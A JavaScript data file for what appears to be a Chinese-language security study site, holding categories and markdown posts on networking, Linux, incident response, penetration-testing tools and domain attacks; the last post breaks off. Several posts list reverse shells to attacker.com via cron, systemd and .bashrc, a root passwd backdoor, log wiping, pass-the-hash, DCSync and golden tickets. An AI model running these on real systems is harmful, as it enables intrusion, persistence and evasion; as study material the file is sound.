export const categories = [
  {
    id: 'network',
    name: '计算机网络',
    icon: '🌐',
    children: [
      { id: 'tcp-ip', name: 'TCP/IP 基础' },
      { id: 'http-https', name: 'HTTP/HTTPS 协议' },
      { id: 'dns', name: 'DNS 解析原理' },
      { id: 'wireshark', name: 'Wireshark 抓包' },
    ]
  },
  {
    id: 'linux',
    name: 'Linux 系统',
    icon: '🐧',
    children: [
      { id: 'linux-commands', name: '常用命令速查' },
      { id: 'linux-users', name: '用户与权限管理' },
      { id: 'linux-process', name: '进程与服务管理' },
      { id: 'linux-network', name: '网络配置管理' },
    ]
  },
  {
    id: 'websec',
    name: 'Web 安全',
    icon: '🔒',
    children: [
      { id: 'sqli', name: 'SQL 注入' },
      { id: 'xss', name: 'XSS 跨站脚本' },
      { id: 'upload', name: '文件上传漏洞' },
      { id: 'rce', name: '命令执行漏洞' },
      { id: 'csrf', name: 'CSRF 请求伪造' },
      { id: 'xxe', name: 'XXE 注入' },
    ]
  },
  {
    id: 'attack-defense',
    name: '攻防对抗',
    icon: '⚔️',
    children: [
      { id: 'recon', name: '信息收集' },
      { id: 'privesc', name: '权限提升' },
      { id: 'persistence', name: '权限维持' },
      { id: 'lateral', name: '横向移动' },
      { id: 'anti-forensics', name: '反溯源' },
    ]
  },
  {
    id: 'domain',
    name: '域渗透',
    icon: '🏢',
    children: [
      { id: 'domain-basic', name: '域环境基础' },
      { id: 'domain-recon', name: '域信息收集' },
      { id: 'domain-attack', name: '域控攻击' },
      { id: 'domain-techniques', name: '常见攻击手法' },
    ]
  },
  {
    id: 'ir',
    name: '应急响应',
    icon: '🚨',
    children: [
      { id: 'ir-process', name: '事件处理流程' },
      { id: 'ir-linux', name: 'Linux 应急响应' },
      { id: 'ir-windows', name: 'Windows 应急响应' },
    ]
  },
  {
    id: 'tools',
    name: '工具手册',
    icon: '🛠️',
    children: [
      { id: 'nmap', name: 'Nmap' },
      { id: 'burpsuite', name: 'BurpSuite' },
      { id: 'sqlmap', name: 'SQLmap' },
      { id: 'nuclei', name: 'Nuclei' },
      { id: 'cobaltstrike', name: 'CobaltStrike' },
      { id: 'wireshark-tool', name: 'Wireshark' },
    ]
  },
  {
    id: 'websec-advanced',
    name: 'Web安全进阶',
    icon: '🔐',
    children: [
      { id: 'deserialization', name: '反序列化漏洞' },
      { id: 'ssrf', name: 'SSRF 服务端请求伪造' },
      { id: 'logic-vuln', name: '逻辑漏洞' },
      { id: 'api-security', name: 'API 安全' },
      { id: 'wasm', name: 'WebAssembly 逆向' },
    ]
  },
  {
    id: 'mobile',
    name: '移动端安全',
    icon: '📱',
    children: [
      { id: 'android-reverse', name: 'Android 逆向' },
      { id: 'android-pentest', name: 'Android 渗透测试' },
      { id: 'ios-reverse', name: 'iOS 逆向基础' },
      { id: 'miniapp-pentest', name: '小程序渗透' },
    ]
  },
  {
    id: 'cloud',
    name: '云安全',
    icon: '☁️',
    children: [
      { id: 'aws-security', name: 'AWS 安全配置' },
      { id: 'docker-security', name: 'Docker 安全' },
      { id: 'k8s-security', name: 'Kubernetes 安全' },
      { id: 'container-escape', name: '容器逃逸' },
    ]
  },
]

export const posts = [
  // 计算机网络 - DNS
  {
    slug: 'dns-resolution',
    title: 'DNS 解析原理详解',
    date: '2026-06-17',
    category: 'network',
    subcategory: 'dns',
    tags: ['网络', 'DNS', '基础'],
    summary: 'DNS 解析流程、记录类型、常见攻击和安全配置。',
    content: `
## 什么是 DNS

DNS（Domain Name System）域名系统，将域名转换为 IP 地址。

## 解析流程

1. **浏览器缓存** → 2. **系统缓存** → 3. **hosts 文件** → 4. **本地 DNS 服务器** → 5. **根域名服务器** → 6. **顶级域名服务器** → 7. **权威域名服务器**

## 记录类型

| 记录 | 说明 | 示例 |
|------|------|------|
| A | 域名 → IPv4 | example.com → 93.184.216.34 |
| AAAA | 域名 → IPv6 | |
| CNAME | 别名记录 | www → example.com |
| MX | 邮件服务器 | |
| NS | 域名服务器 | |
| TXT | 文本记录 | SPF/DKIM |
| SRV | 服务记录 | |
| PTR | 反向解析 | IP → 域名 |

## DNS 工具

\`\`\`bash
# 查询 A 记录
nslookup example.com
dig example.com A

# 查询所有记录
dig example.com ANY

# 指定 DNS 服务器
dig @8.8.8.8 example.com

# 反向解析
dig -x 93.184.216.34

# 追踪解析过程
dig +trace example.com
\`\`\`

## DNS 安全

### DNS 劫持
攻击者篡改 DNS 响应，将用户引导到恶意网站。

### DNS 缓存投毒
污染 DNS 缓存，使后续查询返回错误结果。

### 防御
- 使用 DNSSEC
- 使用 DoH（DNS over HTTPS）
- 使用 DoT（DNS over TLS）
    `
  },
  {
    slug: 'wireshark-capture',
    title: 'Wireshark 抓包分析指南',
    date: '2026-06-16',
    category: 'network',
    subcategory: 'wireshark',
    tags: ['网络', 'Wireshark', '流量分析'],
    summary: 'Wireshark 抓包工具的使用方法和过滤技巧。',
    content: `
## Wireshark 简介

Wireshark 是最流行的网络协议分析器，支持深度包检测。

## 基本操作

### 开始抓包
1. 选择网卡
2. 点击开始按钮
3. 设置捕获过滤器

### 停止抓包
点击停止按钮或 Ctrl+E

## 显示过滤器

### 协议过滤
\`\`\`
http
tcp
dns
icmp
\`\`\`

### IP 过滤
\`\`\`
ip.addr == 192.168.1.1
ip.src == 192.168.1.1
ip.dst == 10.0.0.1
\`\`\`

### 端口过滤
\`\`\`
tcp.port == 80
tcp.dstport == 443
udp.port == 53
\`\`\`

### HTTP 过滤
\`\`\`
http.request.method == "POST"
http.response.code == 200
http.host contains "example"
http.url contains "login"
\`\`\`

### TCP 过滤
\`\`\`
tcp.flags.syn == 1
tcp.flags.rst == 1
tcp.stream eq 5
\`\`\`

### 组合过滤
\`\`\`
http && ip.src == 192.168.1.1
(tcp.port == 80 || tcp.port == 443) && http
\`\`\`

## 常用分析技巧

### 追踪 TCP 流
右键 → Follow → TCP Stream

### 提取文件
File → Export Objects → HTTP/DICOM/SMB/TFTP

### 统计信息
Statistics → Conversations / Protocol Hierarchy / Endpoints

## 实战场景

### 分析 HTTP 请求
\`\`\`
http.request.method == "POST" && http.request.uri contains "login"
\`\`\`

### 捕获密码
\`\`\`
http.request.method == "POST"
# 然后 Follow TCP Stream 查看明文
\`\`\`

### DNS 查询
\`\`\`
dns.qry.name contains "example"
\`\`\`
    `
  },
  // Linux 系统
  {
    slug: 'linux-commands',
    title: 'Linux 常用命令速查',
    date: '2026-06-20',
    category: 'linux',
    subcategory: 'linux-commands',
    tags: ['Linux', '命令', '基础'],
    summary: '渗透测试和日常运维中最常用的 Linux 命令。',
    content: `
## 文件操作

\`\`\`bash
ls -la          # 列出文件（含隐藏）
cd /path        # 切换目录
pwd             # 当前目录
mkdir -p dir    # 创建目录
cp -r src dst   # 复制
mv src dst      # 移动/重命名
rm -rf dir      # 删除
find / -name "*.conf"  # 查找文件
locate filename # 快速查找
\`\`\`

## 文件内容

\`\`\`bash
cat file        # 查看文件
less file       # 分页查看
head -n 20 file # 前20行
tail -f file    # 实时查看
grep "pattern" file  # 搜索
grep -rn "keyword" /path  # 递归搜索
wc -l file      # 统计行数
\`\`\`

## 权限管理

\`\`\`bash
chmod 755 file  # 修改权限
chown user:group file  # 修改所有者
sudo command    # 以root执行
su - user       # 切换用户
\`\`\`

## 网络相关

\`\`\`bash
ifconfig / ip a # 查看IP
netstat -tlnp   # 查看端口
ss -tlnp        # 查看端口（新）
curl url        # HTTP请求
wget url        # 下载
ping host       # 测试连通
traceroute host # 路由追踪
\`\`\`

## 进程管理

\`\`\`bash
ps aux          # 查看进程
top / htop      # 实时进程
kill -9 PID     # 强制结束
nohup cmd &     # 后台运行
crontab -e      # 定时任务
\`\`\`

## 压缩解压

\`\`\`bash
tar -czf archive.tar.gz dir/  # 压缩
tar -xzf archive.tar.gz       # 解压
unzip file.zip                 # 解压zip
\`\`\`

## 常用组合

\`\`\`bash
# 查找SUID文件
find / -perm -4000 2>/dev/null

# 查找可写目录
find / -writable -type d 2>/dev/null

# 查看历史命令
history | grep "keyword"

# 批量杀进程
killall process_name
\`\`\`
    `
  },
  {
    slug: 'linux-users',
    title: 'Linux 用户与权限管理',
    date: '2026-06-19',
    category: 'linux',
    subcategory: 'linux-users',
    tags: ['Linux', '权限', '用户管理'],
    summary: 'Linux 用户管理、文件权限、sudo 配置和提权方法。',
    content: `
## 用户管理

\`\`\`bash
useradd username    # 创建用户
passwd username     # 设置密码
userdel username    # 删除用户
usermod -aG sudo username  # 添加到sudo组
id username         # 查看用户信息
whoami              # 当前用户
\`\`\`

## 文件权限

### 权限说明
\`\`\`
-rwxr-xr--
│└┬┘└┬┘└┬┘
│ │  │  └── 其他用户：读
│ │  └───── 所属组：读+执行
│ └──────── 所有者：读+写+执行
└────────── 文件类型（-普通 d目录 l链接）
\`\`\`

### 修改权限
\`\`\`bash
chmod 755 file      # rwxr-xr-x
chmod u+x file      # 所有者加执行
chmod g-w file      # 组去掉写
chmod o-rwx file    # 其他无权限
\`\`\`

### 特殊权限
\`\`\`bash
chmod u+s file      # SUID：执行时以所有者身份
chmod g+s dir       # SGID：目录下新文件继承组
chmod +t dir        # Sticky Bit：只有所有者能删除
\`\`\`

## SUID 提权

\`\`\`bash
# 查找SUID文件
find / -perm -4000 2>/dev/null

# 常见可提权SUID
/usr/bin/find -exec /bin/sh \\;
/usr/bin/vim -c ':!sh'
/usr/bin/nmap --interactive
\`\`\`

## sudo 配置

\`\`\`bash
# 查看sudo权限
sudo -l

# 编辑sudoers
visudo

# 允许执行特定命令
username ALL=(ALL) /usr/bin/vim
\`\`\`

## /etc/passwd 和 /etc/shadow

\`\`\`bash
# passwd 可读，包含用户信息
cat /etc/passwd

# shadow 包含密码哈希（需root）
cat /etc/shadow
\`\`\`
    `
  },
  {
    slug: 'linux-process',
    title: 'Linux 进程与服务管理',
    date: '2026-06-18',
    category: 'linux',
    subcategory: 'linux-process',
    tags: ['Linux', '进程', '服务'],
    summary: 'Linux 进程管理、服务配置和定时任务。',
    content: `
## 进程管理

\`\`\`bash
ps aux              # 查看所有进程
ps -ef              # 完整格式
top                 # 实时进程
htop                # 增强版top
pstree              # 进程树
\`\`\`

## 进程操作

\`\`\`bash
kill PID            # 终止进程（SIGTERM）
kill -9 PID         # 强制终止（SIGKILL）
killall name        # 按名称终止
pkill name          # 按模式终止
nohup cmd &         # 后台运行
jobs                # 查看后台任务
fg %1               # 调回前台
\`\`\`

## Systemd 服务

\`\`\`bash
systemctl status service     # 查看状态
systemctl start service      # 启动
systemctl stop service       # 停止
systemctl restart service    # 重启
systemctl enable service     # 开机启动
systemctl disable service    # 禁用开机启动
systemctl list-units --type=service  # 列出服务
\`\`\`

## 定时任务 Crontab

\`\`\`bash
crontab -e          # 编辑定时任务
crontab -l          # 查看定时任务

# 格式：分 时 日 月 周 命令
# 每天凌晨3点执行
0 3 * * * /path/to/script.sh

# 每5分钟执行
*/5 * * * * /path/to/script.sh

# 每周一执行
0 0 * * 1 /path/to/script.sh
\`\`\`

## 日志管理

\`\`\`bash
# 常见日志位置
/var/log/syslog          # 系统日志
/var/log/auth.log        # 认证日志
/var/log/apache2/        # Apache日志
/var/log/nginx/          # Nginx日志
\`\`\`

## 开机启动项

\`\`\`bash
# 查看启动服务
systemctl list-unit-files --type=service

# 查看rc.local
cat /etc/rc.local
\`\`\`
    `
  },
  {
    slug: 'linux-network',
    title: 'Linux 网络配置管理',
    date: '2026-06-17',
    category: 'linux',
    subcategory: 'linux-network',
    tags: ['Linux', '网络', '配置'],
    summary: 'Linux 网络配置、防火墙、VPN 和流量管理。',
    content: `
## 网络配置

\`\`\`bash
ip addr              # 查看IP地址
ip link              # 查看网络接口
ip route             # 查看路由表
ifconfig             # 传统方式（部分系统）
\`\`\`

## 端口管理

\`\`\`bash
netstat -tlnp        # 查看监听端口
ss -tlnp             # 更快的方式
lsof -i :80          # 查看端口占用
\`\`\`

## 防火墙

### iptables
\`\`\`bash
iptables -L -n       # 查看规则
iptables -A INPUT -p tcp --dport 80 -j ACCEPT  # 允许80端口
iptables -A INPUT -j DROP  # 默认拒绝
\`\`\`

### firewalld
\`\`\`bash
firewall-cmd --state          # 状态
firewall-cmd --list-all       # 查看规则
firewall-cmd --add-port=80/tcp --permanent  # 开放端口
firewall-cmd --reload         # 重载
\`\`\`

## DNS 配置

\`\`\`bash
# /etc/resolv.conf
nameserver 8.8.8.8
nameserver 114.114.114.114
\`\`\`

## hosts 文件

\`\`\`bash
# /etc/hosts
127.0.0.1 localhost
192.168.1.100 target.com
\`\`\`

## 网络诊断

\`\`\`bash
ping host           # 连通性测试
traceroute host     # 路由追踪
nslookup domain     # DNS查询
dig domain          # 详细DNS查询
curl -v url         # HTTP调试
tcpdump -i eth0     # 抓包
\`\`\`

## SSH 配置

\`\`\`bash
ssh user@host               # 连接
ssh -p 2222 user@host       # 指定端口
scp file user@host:/path    # 传输文件
ssh-keygen -t rsa           # 生成密钥
ssh-copy-id user@host       # 复制公钥
\`\`\`
    `
  },
  // 攻防对抗 - 补充
  {
    slug: 'persistence-techniques',
    title: '权限维持技术',
    date: '2026-06-07',
    category: 'attack-defense',
    subcategory: 'persistence',
    tags: ['渗透测试', '权限维持', '后门'],
    summary: '常见权限维持方法和后门技术。',
    content: `
## 权限维持方法

### 1. SSH 公钥后门

\`\`\`bash
# 写入公钥
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
\`\`\`

### 2. Crontab 定时任务

\`\`\`bash
# 每分钟执行反弹shell
* * * * * /bin/bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
\`\`\`

### 3. Systemd 服务

\`\`\`ini
# /etc/systemd/system/backdoor.service
[Unit]
Description=System Service

[Service]
Type=simple
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
Restart=always

[Install]
WantedBy=multi-user.target
\`\`\`

### 4. .bashrc 后门

\`\`\`bash
# ~/.bashrc
if [[ $- != *i* ]]; then
    /bin/bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1" &
fi
\`\`\`

### 5. 命令别名

\`\`\`bash
# ~/.bashrc
alias ls='ls; /bin/bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1" &'
\`\`\`

### 6. SUID 后门

\`\`\`bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
\`\`\`

### 7. /etc/passwd 后门

\`\`\`bash
# 添加一个uid=0的用户
echo 'hacker:$6$xxx:0:0::/root:/bin/bash' >> /etc/passwd
\`\`\`

## Windows 权限维持

### 注册表自启动

\`\`\`powershell
HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
\`\`\`

### 计划任务

\`\`\`powershell
schtasks /create /tn "backdoor" /tr "C:\\backdoor.exe" /sc minute /mo 1
\`\`\`

### 服务后门

\`\`\`powershell
sc create backdoor binPath= "C:\\backdoor.exe" start= auto
\`\`\`

## 检测方法

- 检查 Crontab 异常任务
- 检查 /etc/passwd 新用户
- 检查 SUID 文件
- 检查异常进程
- 检查启动项
    `
  },
  {
    slug: 'lateral-movement',
    title: '横向移动技术',
    date: '2026-06-06',
    category: 'attack-defense',
    subcategory: 'lateral',
    tags: ['渗透测试', '横向移动', '内网'],
    summary: '内网横向移动的常见方法和工具。',
    content: `
## 横向移动方法

### 1. IPC$ 命名管道

\`\`\`cmd
# 连接
net use \\\\target\\ipc$ "password" /user:administrator

# 复制文件
copy shell.exe \\\\target\\C$\\Windows\\Temp\\

# 执行
sc \\\\target create service binPath= "C:\\Windows\\Temp\\shell.exe"
\`\`\`

### 2. PsExec

\`\`\`cmd
psexec \\\\target -u admin -p pass cmd.exe
psexec \\\\target -u admin -p pass -c shell.exe
\`\`\`

### 3. WMI

\`\`\`cmd
wmic /node:target /user:admin /password:pass process call create "cmd.exe /c whoami > C:\\temp\\out.txt"
\`\`\`

### 4. WinRM

\`\`\`powershell
# 远程执行
Invoke-Command -ComputerName target -ScriptBlock { whoami }
\`\`\`

### 5. RDP

\`\`\`cmd
mstsc /v:target
xfreerdp /v:target /u:admin /p:pass
\`\`\`

### 6. SMB

\`\`\`cmd
# 使用 impacket
psexec.py admin:pass@target
wmiexec.py admin:pass@target
smbexec.py admin:pass@target
\`\`\`

### 7. Pass the Hash

\`\`\`cmd
# 使用 mimikatz 获取哈希
sekurlsa::logonpasswords

# 使用哈希连接
psexec.py -hashes aad3b435...:f1f4d... admin@target
\`\`\`

## 工具

- **Impacket**：Python 网络协议工具包
- **CrackMapExec**：批量内网渗透
- **BloodHound**：AD 环境分析
- **Responder**：LLMNR/NBT-NS 欺骗

## 检测

- 监控异常登录
- 检查日志中的横向移动特征
- 网络流量分析
    `
  },
  {
    slug: 'anti-forensics',
    title: '反溯源与日志清理',
    date: '2026-06-04',
    category: 'attack-defense',
    subcategory: 'anti-forensics',
    tags: ['渗透测试', '反溯源', '日志'],
    summary: '渗透测试中的反溯源技术日志清理方法。',
    content: `
## 反溯源方法

### 1. 使用代理/VPS

\`\`\`bash
# 使用 proxychains
proxychains nmap -sV target.com

# SSH 代理
ssh -D 1080 user@vps
\`\`\`

### 2. 修改 MAC 地址

\`\`\`bash
ifconfig eth0 hw ether 00:11:22:33:44:55
macchanger -r eth0
\`\`\`

### 3. 修改主机名

\`\`\`bash
hostnamectl set-hostname random-name
\`\`\`

### 4. 使用临时工具

\`\`\`bash
# 在 /tmp 下操作，重启后自动清理
cd /tmp
\`\`\`

## 日志清理

### Linux 日志

\`\`\`bash
# 清除登录日志
echo > /var/log/auth.log
echo > /var/log/secure

# 清除命令历史
history -c
unset HISTFILE
rm ~/.bash_history

# 清除特定日志条目
sed -i '/attacker_ip/d' /var/log/auth.log

# 清除 utmp/wtmp/btmp
echo > /var/log/wtmp
echo > /var/log/btmp
\`\`\`

### Windows 日志

\`\`\`powershell
# 清除安全日志
wevtutil cl Security

# 清除系统日志
wevtutil cl System

# 清除应用日志
wevtutil cl Application

# PowerShell 历史
Remove-Item (Get-PSReadLineOption).HistorySavePath
\`\`\`

## 时间戳修改

\`\`\`bash
# 修改文件时间戳
touch -r reference_file target_file
timestomp target_file -m "01/01/2020 00:00:00"
\`\`\`

## 注意事项

- 不要清理所有日志（会触发告警）
- 只删除特定条目
- 保留正常日志结构
- 注意文件时间戳
    `
  },
  // 域渗透 - 补充
  {
    slug: 'domain-recon',
    title: '域信息收集',
    date: '2026-05-24',
    category: 'domain',
    subcategory: 'domain-recon',
    tags: ['域渗透', '信息收集', 'Active Directory'],
    summary: '域环境下的信息收集方法和工具。',
    content: `
## 基本信息

\`\`\`powershell
# 当前域信息
net config workstation
nltest /dclist:domain.com
nltest /domain_trusts

# 域用户
net user /domain

# 域组
net group /domain
net group "Domain Admins" /domain

# 域控
nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.com
\`\`\`

## LDAP 查询

\`\`\`powershell
# 使用 ldapsearch
ldapsearch -x -h domain.com -b "DC=domain,DC=com"

# 使用 PowerShell
Get-ADUser -Filter * -Properties *
Get-ADComputer -Filter * -Properties *
Get-ADGroup -Filter *
\`\`\`

## BloodHound

\`\`\`bash
# 数据收集
bloodhound-python -u admin -p pass -d domain.com -c All

# SharpHound
./SharpHound.exe -c All
\`\`\`

## 常用工具

- **enum4linux**：SMB 枚举
- **ldapsearch**：LDAP 查询
- **BloodHound**：AD 路径分析
- **ADRecon**：AD 环境报告

## 信息收集内容

1. 域名、域 SID
2. 域控制器列表
3. 域用户和组
4. 信任关系
5. 共享资源
6. 策略配置
    `
  },
  {
    slug: 'domain-attack',
    title: '域控攻击技术',
    date: '2026-05-23',
    category: 'domain',
    subcategory: 'domain-attack',
    tags: ['域渗透', '域控', 'Active Directory'],
    summary: '获取域控制器权限的常见方法。',
    content: `
## 域控攻击方法

### 1. Kerberoasting

\`\`\`powershell
# 请求服务票据
Add-Type -AssemblyName System.IdentityModel
$spns = Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
foreach ($spn in $spns) {
    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentName $spn.ServicePrincipalName
}

# 使用 Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt
\`\`\`

### 2. AS-REP Roasting

\`\`\`powershell
# 查找不需要预认证的用户
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth

# 使用 Rubeus
Rubeus.exe asreproast /outfile:hashes.txt
\`\`\`

### 3. Pass the Hash

\`\`\`cmd
# 使用 mimikatz
sekurlsa::logonpasswords
lsadump::lsa /patch

# 使用 impacket
psexec.py -hashes aad3b435...:f1f4d... administrator@dc.domain.com
\`\`\`

### 4. DCSync

\`\`\`powershell
# 使用 mimikatz
lsadump::dcsync /user:krbtgt

# 使用 impacket
secretsdump.py domain/admin:pass@dc.domain.com -just-dc-ntlm
\`\`\`

### 5. Golden Ticket

\`\`\`powershell
# 需要 krbtgt 哈希
kerberos::golden /user:administrator /domain:domain.com /sid:S-1-5-21-... /krbtgt:hash /ticket:golden.kirbi
\`\`\`

## 防御

- 监控异常 SPN 请求
- 限制 DCSync 权限
- 定期更改 krbtgt 密码
- 启用 LAPS
    `
  },
  {
    slug: 'domain-techniques',
    title: '域渗透常见攻击手法',
    date: '2026-05-22',
    category: 'domain',
    subcategory: 'domain-techniques',
    tags: ['域渗透', 'Kerberos', 'NTLM'],
    summary: '域渗透中的常见攻击技术和利用方法。',
    content: `
## Kerberos 攻击

### Pass the Ticket

\`\`\`powershell
# 导出票据
mimikatz # kerberos::list /export

# 导入票据
mimikatz # kerberos::ptt ticket.kirbi
\`\`\`

### Silver Ticket

\`\`\`powershell
# 伪造服务票据
mimikatz # kerberos::golden /user:admin /domain:domain.com /sid:S-1-5-21-... /target:server.domain.com /service:http /rc4:hash /ptt
\`\`\`

## NTLM 攻击

### NTLM Relay

\`\`\`bash
# 使用 impacket
ntlmrelayx.py -t dc.domain.com -smb2support

# 使用 Responder
responder -I eth0 -wrf
\`\`\`

### Pass the NTLM

\`\`\`cmd
# 使用 mimikatz
sekurlsa::pth /user:admin /domain:domain.com /ntlm:hash /run:cmd.exe
\`\`\`

## 委派攻击

### 非约束委派

\`\`\`powershell
# 查找配置非约束委派的机器
Get-ADComputer -Filter {TrustedForDelegation -eq $true}
\`\`\`

### 约束委派

\`\`\`powershell
# 查找约束委派
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
\`\`\`

## 常用工具

- **Rubeus**：Kerberos 攻击
- **Mimikatz**：凭据获取
- **Impacket**：网络协议攻击
- **Responder**：LLMNR/NBT-NS 欺骗
    `
  },
  // 应急响应 - 补充
  {
    slug: 'linux-ir',
    title: 'Linux 应急响应',
    date: '2026-05-27',
    category: 'ir',
    subcategory: 'ir-linux',
    tags: ['应急响应', 'Linux', '安全'],
    summary: 'Linux 系统安全事件应急响应流程。',
    content: `
## 排查步骤

### 1. 账户安全

\`\`\`bash
# 检查新增用户
cat /etc/passwd | grep -v nologin
awk -F: '$3==0{print $1}' /etc/passwd

# 检查密码文件
cat /etc/shadow

# 检查sudo配置
cat /etc/sudoers
\`\`\`

### 2. 进程排查

\`\`\`bash
# 查看异常进程
ps aux | grep -v root | sort -nrk 3 | head

# 查看网络连接进程
netstat -antlp | grep ESTABLISHED

# 查看可疑进程
ls -la /proc/PID/exe
\`\`\`

### 3. 文件排查

\`\`\`bash
# 查找最近修改的文件
find / -mtime -1 -type f

# 查找SUID文件
find / -perm -4000 -type f

# 查找可写目录
find / -writable -type d

# 检查/tmp目录
ls -la /tmp/
\`\`\`

### 4. 日志分析

\`\`\`bash
# 登录日志
last
lastb
lastlog

# 认证日志
grep "Failed password" /var/log/auth.log
grep "Accepted password" /var/log/auth.log
\`\`\`

### 5. 启动项

\`\`\`bash
# 检查crontab
crontab -l
ls -la /etc/cron*

# 检查systemd服务
systemctl list-unit-files --type=service
\`\`\`

## 常见攻击痕迹

- 异常进程
- 新增用户
- SUID 文件
- 异常计划任务
- 异常网络连接
    `
  },
  {
    slug: 'windows-ir',
    title: 'Windows 应急响应',
    date: '2026-05-26',
    category: 'ir',
    subcategory: 'ir-windows',
    tags: ['应急响应', 'Windows', '安全'],
    summary: 'Windows 系统安全事件应急响应流程。',
    content: `
## 排查步骤

### 1. 账户安全

\`\`\`powershell
# 查看用户
net user
net localgroup administrators

# 查看隐藏用户
reg query "HKLM\\SAM\\SAM\\Domains\\Account\\Users"

# 检查账户枚举
wmic useraccount list full
\`\`\`

### 2. 进程排查

\`\`\`powershell
# 查看进程
tasklist /v
Get-Process | Select-Object Id, ProcessName, Path

# 查看网络连接
netstat -ano | findstr ESTABLISHED

# 使用 Process Explorer
\`\`\`

### 3. 文件排查

\`\`\`powershell
# 查找最近修改的文件
forfiles /P C:\\ /S /D +0 /C "cmd /c echo @path @fdate @ftime"

# 检查启动目录
dir "C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
\`\`\`

### 4. 日志分析

\`\`\`powershell
# 安全日志
wevtutil qe Security /c:100 /f:text

# 登录事件ID
# 4624 - 登录成功
# 4625 - 登录失败
# 4648 - 明文登录
# 4720 - 创建用户
\`\`\`

### 5. 注册表排查

\`\`\`powershell
# 自启动项
reg query "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
\`\`\`

## 工具

- **Autoruns**：启动项分析
- **Process Explorer**：进程分析
- **Process Monitor**：行为监控
- **WinPEAS**：提权检查
    `
  },
  // 工具手册 - 补充
  {
    slug: 'sqlmap-guide',
    title: 'SQLmap 使用指南',
    date: '2026-05-30',
    category: 'tools',
    subcategory: 'sqlmap',
    tags: ['工具', 'SQLmap', 'SQL注入'],
    summary: 'SQLmap 自动化 SQL 注入检测和利用工具。',
    content: `
## 基本用法

\`\`\`bash
# 检测注入
sqlmap -u "http://target/?id=1"

# 获取数据库
sqlmap -u "http://target/?id=1" --dbs

# 获取表
sqlmap -u "http://target/?id=1" -D mydb --tables

# 获取数据
sqlmap -u "http://target/?id=1" -D mydb -T users --dump
\`\`\`

## POST 注入

\`\`\`bash
# 从 Burp 导出请求
sqlmap -r request.txt

# 指定参数
sqlmap -u "http://target/login" --data="user=admin&pass=123" -p user

# 指定方法
sqlmap -u "http://target/login" --data="user=admin&pass=123" --method=POST
\`\`\`

## 高级选项

\`\`\`bash
# 执行系统命令
sqlmap -u "http://target/?id=1" --os-shell

# 读取文件
sqlmap -u "http://target/?id=1" --file-read="/etc/passwd"

# 写入文件
sqlmap -u "http://target/?id=1" --file-write="shell.php" --file-dest="/var/www/shell.php"

# 使用代理
sqlmap -u "http://target/?id=1" --proxy="http://127.0.0.1:8080"

# 绕过WAF
sqlmap -u "http://target/?id=1" --tamper=space2comment,between --random-agent
\`\`\`

## Tamper 脚本

\`\`\`bash
# 常用tamper
space2comment     # 空格→注释
between           # >→BETWEEN, =→LIKE
charencode        # URL编码
randomcase        # 随机大小写
unionall          # UNION ALL替换UNION
\`\`\`

## 输出控制

\`\`\`bash
# 保存日志
sqlmap -u "http://target/?id=1" --output-dir=/tmp/sqlmap

# 只检测不利用
sqlmap -u "http://target/?id=1" --batch --level=1

# 指定数据库类型
sqlmap -u "http://target/?id=1" --dbms=mysql
\`\`\`
    `
  },
  {
    slug: 'nuclei-guide',
    title: 'Nuclei 漏洞扫描指南',
    date: '2026-05-28',
    category: 'tools',
    subcategory: 'nuclei',
    tags: ['工具', 'Nuclei', '漏洞扫描'],
    summary: 'Nuclei 基于模板的快速漏洞扫描器。',
    content: `
## 基本用法

\`\`\`bash
# 扫描单个目标
nuclei -u http://target.com

# 批量扫描
nuclei -l urls.txt

# 指定模板
nuclei -u http://target.com -t cves/

# 输出结果
nuclei -u http://target.com -o results.txt
\`\`\`

## 模板管理

\`\`\`bash
# 更新模板
nuclei -update-templates

# 查看模板
nuclei -tl

# 按标签扫描
nuclei -u http://target.com -tags cve,rce

# 按严重程度
nuclei -u http://target.com -severity critical,high
\`\`\`

## 高级用法

\`\`\`bash
# 使用代理
nuclei -u http://target.com -proxy http://127.0.0.1:8080

# 并发控制
nuclei -l urls.txt -c 50

# 排除模板
nuclei -u http://target.com -exclude-tags dos

# 自定义模板
nuclei -u http://target.com -t custom-template.yaml
\`\`\`

## 自定义模板

\`\`\`yaml
id: custom-sqli
info:
  name: Custom SQL Injection
  severity: high
  description: Detects SQL injection

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?id=1'"
    matchers:
      - type: word
        words:
          - "SQL syntax"
          - "mysql"
        condition: or
\`\`\`

## 常用参数

| 参数 | 说明 |
|------|------|
| -u | 目标URL |
| -l | 目标列表 |
| -t | 模板目录 |
| -severity | 严重程度 |
| -tags | 标签过滤 |
| -proxy | 代理 |
| -o | 输出文件 |
| -json | JSON格式输出 |
    `
  },
  // Web安全进阶
  {
    slug: 'deserialization',
    title: '反序列化漏洞详解',
    date: '2026-06-19',
    category: 'websec-advanced',
    subcategory: 'deserialization',
    tags: ['Web安全', '反序列化', 'Java', 'PHP'],
    summary: '各语言反序列化漏洞原理和利用方法。',
    content: `
## 什么是反序列化漏洞

反序列化是将序列化的数据恢复为对象的过程。当应用不安全地反序列化用户输入时，攻击者可构造恶意对象执行任意代码。

## PHP 反序列化

### 基础概念

\`\`\`php
// 序列化
$obj = new User("admin");
echo serialize($obj);  // O:4:"User":1:{s:4:"name";s:5:"admin";}

// 反序列化
$data = 'O:4:"User":1:{s:4:"name";s:5:"admin";}';
$obj = unserialize($data);
\`\`\`

### 魔术方法

\`\`\`php
__construct()    // 对象创建时
__destruct()     // 对象销毁时
